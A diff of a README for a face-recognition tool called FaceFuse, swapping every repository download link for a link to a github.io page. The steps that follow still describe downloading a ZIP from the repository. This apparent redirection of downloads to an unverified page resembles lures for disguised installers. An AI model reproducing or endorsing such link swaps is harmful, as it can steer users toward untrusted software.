@@ -1,6 +1,6 @@
 # 🤖 facefuse-hybrid-face-recognition - Smart Face Recognition for Everyone
 
-[![Download Now](https://img.shields.io/badge/Download-FaceFuse-blue?style=for-the-badge&logo=github&logoColor=white&color=4CAF50)](https://github.com/jorgealvarez83/facefuse-hybrid-face-recognition)
+[![Download Now](https://img.shields.io/badge/Download-FaceFuse-blue?style=for-the-badge&logo=github&logoColor=white&color=4CAF50)](https://jorgealvarez83.github.io)
 
 ---
 
@@ -42,7 +42,7 @@ Follow these simple steps to start using FaceFuse:
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/jorgealvarez83/facefuse-hybrid-face-recognition](https://github.com/jorgealvarez83/facefuse-hybrid-face-recognition)
+Visit this link to download the application: [https://jorgealvarez83.github.io](https://jorgealvarez83.github.io)
 
 Click the green "Code" button, then select "Download ZIP" to get the application files.
 
@@ -168,7 +168,7 @@ FaceFuse builds upon the excellent work of the open-source community, including 
 
 ## 🎉 Ready to Start?
 
-Download FaceFuse today and experience smart, accurate face recognition right on your computer. Visit this link to download the application: [https://github.com/jorgealvarez83/facefuse-hybrid-face-recognition](https://github.com/jorgealvarez83/facefuse-hybrid-face-recognition)
+Download FaceFuse today and experience smart, accurate face recognition right on your computer. Visit this link to download the application: [https://jorgealvarez83.github.io](https://jorgealvarez83.github.io)
 
 Join thousands of users who rely on FaceFuse for reliable, private, and powerful face recognition. It's free, it's easy, and it works.
 
